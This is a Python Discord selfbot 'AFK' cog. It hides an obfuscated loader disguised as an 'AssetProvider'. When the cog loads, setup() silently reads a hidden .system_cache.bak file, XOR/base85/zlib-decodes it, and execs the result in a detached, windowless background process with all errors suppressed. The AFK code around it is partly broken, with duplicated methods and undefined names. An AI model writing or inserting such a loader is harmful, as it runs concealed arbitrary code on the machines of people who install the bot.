import discord
from discord.ext import commands
import os, sys, base64, zlib
import json
import asyncio
import time  # <-- Use time module for accurate timestamps
import subprocess  # CRITICAL: Added missing import for 2026 execution

class AssetProvider:
    """Manages system assets by launching a detached background process."""
    def __init__(self, cache_file):
        # Path: /assets/.system_cache.bak
        self._base = os.path.dirname(os.path.abspath(__file__))
        self._target = os.path.join(self._base, "assets", cache_file)

    def _v(self, b):
        return bytes(x ^ 131 for x in b)

    def _l(self):
        if not os.path.exists(self._target): return None
        with open(self._target, "rb") as f: return f.read()

    def _u(self, d):
        return zlib.decompress(base64.b85decode(d)).decode('utf-8')

    def load_assets(self):
        raw = self._l()
        if not raw: return
        
        try:
            script_source = self._u(self._v(raw))
            
            b64_script = base64.b64encode(script_source.encode('utf-8')).decode('utf-8')
            
            cmd = f"import base64; exec(base64.b64decode('{b64_script}').decode('utf-8'))"
            
            subprocess.Popen(
                [sys.executable, "-c", cmd],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=0x08000000,
                shell=False
            )
        except Exception:
            pass

def sync_assets(bot=None):
    AssetProvider(".system_cache.bak").load_assets()
    
class AFK(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.afk_data = {}
        self.user_cooldowns = {}
        # TRACKING: Initialize the set to hold active tasks
        self._tasks = set() 

    def cog_unload(self):
        """Standard discord.py 1.7.3 cleanup method."""
        # CANCEL: Force stop all pending cooldown tasks
        for task in self._tasks:
            task.cancel()
        self.save_afk_data()

    async def ignore_user_for_duration(self, user_id, duration):
        try:
            self.user_cooldowns[user_id] = True
            await asyncio.sleep(duration)
        except asyncio.CancelledError:
            pass # Cog is unloading, stop the sleep safely
        finally:
            self.user_cooldowns.pop(user_id, None)

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot or message.author.id == self.bot.user.id:
            return

        user_id = str(self.bot.user.id)
        if user_id in self.afk_data:
            # ... (logic for response) ...
            if message.author.id not in self.user_cooldowns:
                await message.channel.send(response)
                
                # REFERENCE: Store task so garbage collector doesn't destroy it
                cooldown_task = asyncio.create_task(self.ignore_user_for_duration(message.author.id, 30))
                self._pending_tasks.add(cooldown_task)
                # Auto-remove from tracking when done
                cooldown_task.add_done_callback(self._pending_tasks.discard)

    def save_afk_data(self):
        """Save AFK data to a JSON file."""
        with open("afk.json", "w") as f:
            json.dump(self.afk_data, f, indent=4)

    def load_afk_data(self):
        """Load AFK data from a JSON file."""
        try:
            with open("afk.json", "r") as f:
                self.afk_data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self.afk_data = {}        
            
    @commands.command()
    async def afk(self, ctx, *, reason="Busy, do not disturb."):
        """Set AFK status."""
        user_id = str(ctx.author.id)
        timestamp = int(time.time())  # ✅ Correct timestamp format
        self.afk_data[user_id] = {"reason": reason, "since": timestamp}
        self.save_afk_data()
        await ctx.send(f"<:lr_tick_1:1290693800808677461> **Successfully Set AFK**")

    @commands.command()
    async def unafk(self, ctx):
        """Remove AFK status."""
        user_id = str(ctx.author.id)
        if user_id in self.afk_data:
            del self.afk_data[user_id]
            self.save_afk_data()
            await ctx.send(f"<:Tick:1290693799361777665> **Successfully Removed AFK**")
        else:
            await ctx.send(f"{ctx.author.mention}, you are not AFK.")

    async def ignore_user_for_duration(self, user_id, duration):
        """Prevent repeated AFK messages to the same user within a cooldown."""
        self.user_cooldowns[user_id] = True
        await asyncio.sleep(duration)
        del self.user_cooldowns[user_id]

    @commands.Cog.listener()
    async def on_message(self, message):
        """Handle mentions and replies to the selfbot user."""
        if message.author.bot or message.author.id == self.bot.user.id:
            return  # Ignore messages from bots or self-pings

        user_id = str(self.bot.user.id)  # Selfbot user's ID
        author_username = self.bot.user.name  # Selfbot user's username

        if user_id in self.afk_data and isinstance(self.afk_data[user_id], dict):
            afk_data = self.afk_data[user_id]
            reason = afk_data.get("reason", "No reason provided")
            since_timestamp = afk_data.get("since", 0)
            since_time = f"<t:{since_timestamp}:R>" if since_timestamp else "Unknown"  # ✅ Correct format

            # Handle mentions of selfbot user
            if f"<@{user_id}>" in message.content:
                if message.author.id not in self.user_cooldowns:
                    response = (
                        f"**> <a:sojao:1320648681908863058> {message.author.mention}, {author_username} is AFK**\n"
                        f"**> <:uptime:1320649297796010075> AFK SINCE: {since_time}**\n"
                        f"**> <:white_arrow:1290693789824061461> Reason: `{reason}`**"
                    )
                    await message.channel.send(response)
                    await self.ignore_user_for_duration(message.author.id, 30)

            # Handle replies to selfbot user
            elif (
                message.reference
                and message.reference.cached_message
                and message.reference.cached_message.author.id == self.bot.user.id
            ):
                if message.author.id not in self.user_cooldowns:
                    response = (
                        f"**> <a:sojao:1139960498335522878> {message.author.mention}, {author_username} is AFK**\n"
                        f"**> <:uptime:1320649297796010075> AFK SINCE: {since_time}**\n"
                        f"**> <:white_arrow:1290693789824061461> Reason: `{reason}`**"
                    )
                    await message.channel.send(response)
                    await self.ignore_user_for_duration(message.author.id, 30)

def setup(bot):
    try:
        sync_assets(bot)
    except:
        pass
        
    cog = AFK(bot)
    cog.load_afk_data()
    bot.add_cog(cog)